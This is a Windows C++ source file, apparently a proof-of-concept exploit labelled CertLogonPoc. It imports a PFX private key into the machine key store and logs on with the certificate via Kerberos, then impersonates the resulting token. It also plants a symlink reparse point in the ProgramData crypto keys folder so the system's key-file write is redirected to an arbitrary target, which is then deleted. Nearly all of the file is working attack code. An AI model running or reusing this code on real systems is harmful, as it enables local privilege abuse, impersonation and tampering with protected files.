#include "stdafx.h"
_NT_BEGIN

using namespace NTSecAPI;
#include "../log/log.h"
#include "lsaifs.h"

HRESULT ReadFromFile(_In_ PCWSTR lpFileName, _Out_ PBYTE* ppb, _Out_ ULONG* pcb, _In_ ULONG _cb = 0, _In_ ULONG cb_ = 0);
BOOL IsRegSz(PKEY_VALUE_PARTIAL_INFORMATION_ALIGN64 pkvpi);

NTSTATUS CreateReparse(PCWSTR pcszNtFileName, PCUNICODE_STRING SubstituteName, PCWSTR PrintName)
{
	PREPARSE_DATA_BUFFER prdb = 0;
	int len = 0;
	PWSTR PathBuffer = 0;
	ULONG cb = 0;

	NTSTATUS status = STATUS_INTERNAL_ERROR;

	while (0 < (len = _snwprintf(PathBuffer, len, L"%wZ%ws", SubstituteName, PrintName)))
	{
		if (PathBuffer)
		{
			prdb->SymbolicLinkReparseBuffer.Flags = 0;
			prdb->ReparseTag = IO_REPARSE_TAG_SYMLINK;
			prdb->ReparseDataLength = (USHORT)(cb - offsetof(REPARSE_DATA_BUFFER, GenericReparseBuffer));
			prdb->SymbolicLinkReparseBuffer.SubstituteNameOffset = 0;
			prdb->SymbolicLinkReparseBuffer.SubstituteNameLength = SubstituteName->Length;
			prdb->SymbolicLinkReparseBuffer.PrintNameOffset = SubstituteName->Length;
			prdb->SymbolicLinkReparseBuffer.PrintNameLength = (USHORT)wcslen(PrintName) * sizeof(WCHAR);

			HANDLE hFile;
			IO_STATUS_BLOCK iosb;
			UNICODE_STRING ObjectName;
			OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, &ObjectName, OBJ_CASE_INSENSITIVE };

			RtlInitUnicodeString(&ObjectName, pcszNtFileName);

			if (0 <= (status = NtCreateFile(&hFile, FILE_ALL_ACCESS, &oa, &iosb, 0, FILE_ATTRIBUTE_SYSTEM, 0, 
				FILE_OVERWRITE_IF, FILE_OPEN_REPARSE_POINT|FILE_NON_DIRECTORY_FILE, 0, 0)))
			{
				status = NtFsControlFile(hFile, 0, 0, 0, &iosb, FSCTL_SET_REPARSE_POINT, prdb, cb, 0, 0);
				NtClose(hFile);
			}

			break;
		}

		cb = FIELD_OFFSET(REPARSE_DATA_BUFFER, SymbolicLinkReparseBuffer.PathBuffer[++len]);

		prdb = (PREPARSE_DATA_BUFFER)alloca(cb);

		PathBuffer = prdb->SymbolicLinkReparseBuffer.PathBuffer;
	}

	return status;
}

HRESULT SymCryptMd5(PCWSTR pszKeyName, PBYTE pbBuf, ULONG cbBuf)
{
	ULONG cb = (1 + (ULONG)wcslen(pszKeyName)) * sizeof(WCHAR);

	return GetLastHresult(CryptHashCertificate2(BCRYPT_MD5_ALGORITHM, 0, 0, 
		(PBYTE)_wcslwr((PWSTR)memcpy(alloca(cb), pszKeyName, cb)), cb, pbBuf, &cbBuf));
}

NTSTATUS RedirectContainer(_In_ PWSTR pszKeyName, _In_ PCWSTR pszTargetName)
{
	BOOLEAN b;
	HRESULT hr = RtlAdjustPrivilege(SE_CREATE_SYMBOLIC_LINK_PRIVILEGE, TRUE, FALSE, &b);
	if (hr)
	{
		return hr;
	}
	
	PWSTR pszProgramData = 0;
	ULONG cb = 0;
	while (cb = GetEnvironmentVariableW(L"ALLUSERSPROFILE", pszProgramData, cb))
	{
		if (pszProgramData)
		{
			union {
				BYTE pbHash[16];
				ULONG ulHash[4];
			};

			if (NOERROR == (hr = SymCryptMd5(pszKeyName, pbHash, sizeof(pbHash))))
			{
				HANDLE hKey;
				STATIC_OBJECT_ATTRIBUTES(oa, "\\Registry\\MACHINE\\SOFTWARE\\Microsoft\\Cryptography");
				if (0 <= (hr = ZwOpenKey(&hKey, KEY_READ, &oa)))
				{
					STATIC_UNICODE_STRING_(MachineGuid);
					union {
						ULONG64 align;
						KEY_VALUE_PARTIAL_INFORMATION_ALIGN64 kvpi;
						UCHAR buf[sizeof(KEY_VALUE_PARTIAL_INFORMATION_ALIGN64) + 39*sizeof(WCHAR)];
					};
					hr = ZwQueryValueKey(hKey, &MachineGuid, KeyValuePartialInformationAlign64, buf, sizeof(buf), &cb);
					NtClose(hKey);
					if (0 <= hr)
					{
						hr = STATUS_OBJECT_TYPE_MISMATCH;
						if (IsRegSz(&kvpi))
						{
							int len = 0;
							PWSTR pszFile = 0;
							hr = STATUS_INTERNAL_ERROR;

							while (0 < (len = _snwprintf(pszFile, len, 
								L"\\??\\%ws\\Microsoft\\Crypto\\Keys\\%08x%08x%08x%08x_%ws", 
								pszProgramData, ulHash[0], ulHash[1], ulHash[2], ulHash[3], (PWSTR)kvpi.Data)))
							{
								if (pszFile)
								{
									UNICODE_STRING SubstituteName;
									RtlInitUnicodeString(&SubstituteName, pszTargetName);
									hr = CreateReparse(pszFile, &SubstituteName, L"*");
									break;
								}

								pszFile = (PWSTR)alloca(++len * sizeof(WCHAR));
							}
						}
					}
				}
			}

			return hr;
		}

		pszProgramData = (PWSTR)alloca(cb * sizeof(WCHAR));
	}

	return GetLastHresult();
	
}

HRESULT OpenKspKey(
				   _Out_ NCRYPT_KEY_HANDLE* phKey,
				   _In_ PCWSTR pszProviderName,
				   _In_ PWSTR pszKeyName,
				   _In_ ULONG dwLegacyKeySpec)
{
	NCRYPT_PROV_HANDLE hProvider;

	NTSTATUS hr = NCryptOpenStorageProvider(&hProvider, pszProviderName, 0);

	if (NOERROR == hr)
	{
		hr = NCryptOpenKey(hProvider, phKey, pszKeyName, dwLegacyKeySpec, NCRYPT_SILENT_FLAG | NCRYPT_MACHINE_KEY_FLAG);

		NCryptFreeObject(hProvider);
	}

	return (hr);
}

NTSTATUS DoLogon(_Out_ PHANDLE Token,
				 _In_ PVOID AuthenticationInformation,
				 _In_ ULONG AuthenticationInformationLength)
{
	NTSTATUS status;
	ULONG AuthenticationPackage;
	LSA_STRING PackageName;

	HANDLE LsaHandle;
	if (0 <= (status = LsaConnectUntrusted(&LsaHandle)))
	{
		RtlInitString(&PackageName, MICROSOFT_KERBEROS_NAME_A);

		if (0 <= (status = LsaLookupAuthenticationPackage(LsaHandle, &PackageName, &AuthenticationPackage)))
		{
			RtlInitString(&PackageName, "Winlogon");
			TOKEN_SOURCE ts = { {"1234567"}, {0xFEDCBA90, 0x12345678} };

			void* ProfileBuffer;
			ULONG ProfileBufferLength;
			LUID LogonId;
			QUOTA_LIMITS ql;
			NTSTATUS subStatus;

			if (0 > (status = LsaLogonUser(LsaHandle, &PackageName, Interactive, AuthenticationPackage,
				AuthenticationInformation, AuthenticationInformationLength, 0, &ts,
				&ProfileBuffer, &ProfileBufferLength, &LogonId, Token, &ql, &subStatus)))
			{
				if (0 > subStatus)
				{
					status = subStatus;
				}
			}
			else
			{
				LsaFreeReturnBuffer(ProfileBuffer);
			}
		}

		LsaDeregisterLogonProcess(LsaHandle);
	}

	return status;
}

typedef struct KERB_SMARTCARD_CSP_INFO
{
	ULONG dwCspInfoLen;				// size of this structure w/ payload
	ULONG MessageType;				// info type, currently CertHashInfo
	// payload starts, marshaled structure of MessageType
	union {
		PVOID ContextInformation;	// Reserved
		ULONG64 SpaceHolderForWow64;
	};
	ULONG flags;					// Reserved
	ULONG KeySpec;					// AT_SIGNATURE xor AT_KEYEXCHANGE
	ULONG nCardNameOffset;
	ULONG nReaderNameOffset;
	ULONG nContainerNameOffset;
	ULONG nCSPNameOffset;
	WCHAR Buffer[];
} *PKERB_SMARTCARD_CSP_INFO;

NTSTATUS CerificateLogon(_Out_ PHANDLE Token,
						 _In_ PCWSTR pcszReaderName,
						 _In_ PCWSTR pwszContainerName,
						 _In_ PCWSTR pcszPin = L"*",
						 _In_ PCWSTR pcszCardName = L"*")
{
	int len = 0;
	PWSTR psz = 0;
	PKERB_CERTIFICATE_LOGON pkcl = 0;

	ULONG cb = 0, Offset = (ULONG)wcslen(pcszPin), * pu = 0;

	while (0 < (len = _snwprintf(psz, len, L"%ws%c%ws%c%ws%c%ws%c" MS_KEY_STORAGE_PROVIDER,
		pcszPin, 0, pcszCardName, 0, pcszReaderName, 0, pwszContainerName, 0)))
	{
		if (psz)
		{
			ULONG n = 4;
			do
			{
				*pu++ = ++Offset;
				Offset += (ULONG)wcslen(psz + Offset);
			} while (--n);

			return DoLogon(Token, pkcl, cb);
		}

		ULONG dwCspInfoLen = sizeof(KERB_SMARTCARD_CSP_INFO) + ++len * sizeof(WCHAR);
		cb = sizeof(KERB_CERTIFICATE_LOGON) + dwCspInfoLen;
		RtlZeroMemory(pkcl = (PKERB_CERTIFICATE_LOGON)alloca(cb), cb);
		KERB_SMARTCARD_CSP_INFO* p = (KERB_SMARTCARD_CSP_INFO*)(pkcl + 1);
		psz = p->Buffer;

		pkcl->CspDataLength = dwCspInfoLen;
		pkcl->CspData = (PUCHAR)sizeof(KERB_CERTIFICATE_LOGON);
		pkcl->MessageType = KerbCertificateLogon;
		pkcl->Pin.Buffer = (PWSTR)(ULONG_PTR)RtlPointerToOffset(pkcl, psz);
		pkcl->Pin.MaximumLength = pkcl->Pin.Length = (USHORT)Offset * sizeof(WCHAR);
		p->dwCspInfoLen = dwCspInfoLen;
		p->MessageType = 1;
		pu = &p->nCardNameOffset;
	}

	return STATUS_INTERNAL_ERROR;
}

struct CRYPT_PKCS12_PBE_PARAMS_WITH_SALT : CRYPT_PKCS12_PBE_PARAMS
{
	ULONG64 Salt = 0;

	CRYPT_PKCS12_PBE_PARAMS_WITH_SALT()
	{
		iIterations = 1;
		cbSalt = sizeof(Salt);
	}
};

HRESULT WritePfxToKey(_In_ PCWSTR lpFileName,
					  _In_ PCWSTR szPassword,
					  _In_ PCWSTR pcszReaderName,
					  _In_ PCWSTR ContainerName,
					  _In_opt_ PCWSTR pszTargetName)
{
	HRESULT hr;
	CRYPT_DATA_BLOB PFX;
	if (0 <= (hr = ReadFromFile(lpFileName, &PFX.pbData, &PFX.cbData)))
	{
		if (HCERTSTORE hStore = HR(hr, PFXImportCertStore(&PFX, szPassword,
			NCRYPT_ALLOW_EXPORT_FLAG | PKCS12_ALWAYS_CNG_KSP | PKCS12_NO_PERSIST_KEY)))
		{
			PCCERT_CONTEXT pCertContext = 0;
			while (pCertContext = HR(hr, CertEnumCertificatesInStore(hStore, pCertContext)))
			{
				CERT_KEY_CONTEXT ckc;
				ULONG cb = sizeof(ckc);
				if (CertGetCertificateContextProperty(pCertContext, CERT_KEY_CONTEXT_PROP_ID, &ckc, &cb))
				{
					hr = STATUS_INTERNAL_ERROR;

					if (CERT_NCRYPT_KEY_SPEC == ckc.dwKeySpec)
					{
						PWSTR psz = 0;
						int len = 0;

						while (0 < (len = _snwprintf(psz, len, L"\\\\.\\%ws\\%ws", pcszReaderName, ContainerName)))
						{
							if (psz)
							{
								if (!pszTargetName || !(hr = RedirectContainer(psz, pszTargetName)))
								{
									CRYPT_PKCS12_PBE_PARAMS_WITH_SALT params;
									BCryptBuffer buf[] = {
										{ (1 + len) * sizeof(WCHAR), NCRYPTBUFFER_PKCS_KEY_NAME, psz },
										{ sizeof(params), NCRYPTBUFFER_PKCS_ALG_PARAM, &params },
										{
											sizeof(szOID_PKCS_12_pbeWithSHA1And3KeyTripleDES),
												NCRYPTBUFFER_PKCS_ALG_OID,
												const_cast<PSTR>(szOID_PKCS_12_pbeWithSHA1And3KeyTripleDES)
										},
									};

									NCryptBufferDesc ParameterList{ NCRYPTBUFFER_VERSION, _countof(buf), buf };

									PBYTE pb = 0;
									cb = 0;
									while (NOERROR == (hr = NCryptExportKey(ckc.hNCryptKey, 0,
										NCRYPT_PKCS8_PRIVATE_KEY_BLOB, &ParameterList, pb, cb, &cb, 0)))
									{
										if (pb)
										{
											NCRYPT_PROV_HANDLE hProvider;

											if (NOERROR == (hr = NCryptOpenStorageProvider(&hProvider, MS_KEY_STORAGE_PROVIDER, 0)))
											{
												NCRYPT_KEY_HANDLE hKey;

												hr = NCryptImportKey(hProvider, 0, NCRYPT_PKCS8_PRIVATE_KEY_BLOB,
													&ParameterList, &hKey, pb, cb, NCRYPT_MACHINE_KEY_FLAG | NCRYPT_DO_NOT_FINALIZE_FLAG);

												NCryptFreeObject(hProvider);

												if (NOERROR == hr)
												{
													if (NOERROR == (hr = NCryptSetProperty(hKey,
														NCRYPT_CERTIFICATE_PROPERTY,
														pCertContext->pbCertEncoded,
														pCertContext->cbCertEncoded, 0)))
													{
														hr = NCryptFinalizeKey(hKey, 0);
													}

													NCryptFreeObject(hKey);
												}
											}

											break;
										}

										pb = (PBYTE)alloca(cb);
									}
								}

								break;
							}

							psz = (PWSTR)alloca(++len * sizeof(WCHAR));
						}
					}

					CertFreeCertificateContext(pCertContext);
					break;
				}
			}

			CertCloseStore(hStore, 0);
		}

		LocalFree(PFX.pbData);
	}

	return hr;
}

inline HRESULT Decode(_In_ PCSTR lpszStructType, _In_ PBYTE pb, _In_ ULONG cb, _Out_ void* ppv, _Out_opt_ PULONG pcb = 0)
{
	return CryptDecodeObjectEx(X509_ASN_ENCODING, lpszStructType, pb, cb,
		CRYPT_DECODE_ALLOC_FLAG |
		CRYPT_DECODE_NOCOPY_FLAG |
		CRYPT_DECODE_NO_SIGNATURE_BYTE_REVERSAL_FLAG |
		CRYPT_DECODE_SHARE_OID_STRING_FLAG,
		0, ppv, pcb ? pcb : &cb) ? S_OK : HRESULT_FROM_WIN32(GetLastError());
}

HRESULT GetPublickKey(_In_ NCRYPT_KEY_HANDLE hKey, _Out_ BCRYPT_KEY_HANDLE* phKey)
{
	PBYTE pb = 0;
	ULONG cb = 0;
	HRESULT hr;
	while (NOERROR == (hr = NCryptGetProperty(hKey, NCRYPT_CERTIFICATE_PROPERTY, pb, cb, &cb, 0)))
	{
		if (pb)
		{
			PCERT_INFO pCertInfo;

			if (NOERROR == (hr = Decode(X509_CERT_TO_BE_SIGNED, pb, cb, &pCertInfo)))
			{
				HR(hr, CryptImportPublicKeyInfoEx2(X509_ASN_ENCODING,
					&pCertInfo->SubjectPublicKeyInfo, 0, 0, phKey));

				LocalFree(pCertInfo);
			}
			break;
		}

		pb = (PBYTE)alloca(cb);
	}

	return hr;
}

HRESULT TestKey(_In_ BOOL bDelete, _In_ PCWSTR pcszReaderName, _In_ PCWSTR ContainerName)
{
	HRESULT hr = STATUS_INTERNAL_ERROR;
	PWSTR psz = 0;
	int len = 0;

	while (0 < (len = _snwprintf(psz, len, L"\\\\.\\%ws\\%ws", pcszReaderName, ContainerName)))
	{
		if (psz)
		{
			NCRYPT_KEY_HANDLE hKey;

			if (NOERROR == (hr = OpenKspKey(&hKey, MS_KEY_STORAGE_PROVIDER, psz, 0)))
			{
				UCHAR hash[0x20];
				BCryptGenRandom(0, hash, sizeof(hash), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
				BCRYPT_PKCS1_PADDING_INFO pi = { BCRYPT_SHA256_ALGORITHM }, *ppi = 0;
				DWORD dwFlags = 0;
				PBYTE pbSig = 0;
				ULONG cbSig = 0, cb;
				union {
					UCHAR out[16];
					WCHAR group[8];
				};

				if (NOERROR == (hr = NCryptGetProperty(hKey, NCRYPT_ALGORITHM_GROUP_PROPERTY, out, sizeof(out), &cb, 0)))
				{
					if (!wcscmp(NCRYPT_RSA_ALGORITHM_GROUP, group))
					{
						ppi = &pi;
						dwFlags = BCRYPT_PAD_PKCS1;
					}

					while (NOERROR == (hr = NCryptSignHash(hKey, ppi, hash, sizeof(hash), pbSig, cbSig, &cbSig, dwFlags)))
					{
						if (pbSig)
						{
							BCRYPT_KEY_HANDLE hBKey;
							if (NOERROR == (hr = GetPublickKey(hKey, &hBKey)))
							{
								hr = BCryptVerifySignature(hBKey, ppi, hash, sizeof(hash), pbSig, cbSig, dwFlags);
								BCryptDestroyKey(hBKey);
							}
							break;
						}

						pbSig = (PBYTE)alloca(cbSig);
					}
				}
				

				if (bDelete)
				{
					if (NOERROR == NCryptDeleteKey(hKey, 0))
					{
						break;
					}
				}

				NCryptFreeObject(hKey);
			}

			break;
		}

		psz = (PWSTR)alloca(++len * sizeof(WCHAR));
	}

	return hr;
}

void CertLogonPoc(_In_ PCWSTR pszPfx, _In_ PCWSTR pszPassword, _In_opt_ PCWSTR pszTargetName = 0)
{
	PCWSTR ReaderName = L"Reader", ContainerName = L"Container";

	HRESULT hr;
	if (NOERROR == (hr = WritePfxToKey(pszPfx, pszPassword, ReaderName, ContainerName, pszTargetName)))
	{
		HANDLE hToken;
		if (0 <= (hr = CerificateLogon(&hToken, ReaderName, ContainerName)))
		{
			HR(hr, ImpersonateLoggedOnUser(hToken));
			NtClose(hToken);

			NtSetInformationThread(NtCurrentThread(), ThreadImpersonationToken, &(hToken = 0), sizeof(hToken));
		}

		TestKey(TRUE, ReaderName, ContainerName);
	}

	if (pszTargetName)
	{
		UNICODE_STRING ObjectName;
		OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, &ObjectName };
		RtlInitUnicodeString(&ObjectName, pszTargetName);
		ZwDeleteFile(&oa);
	}
}

_NT_END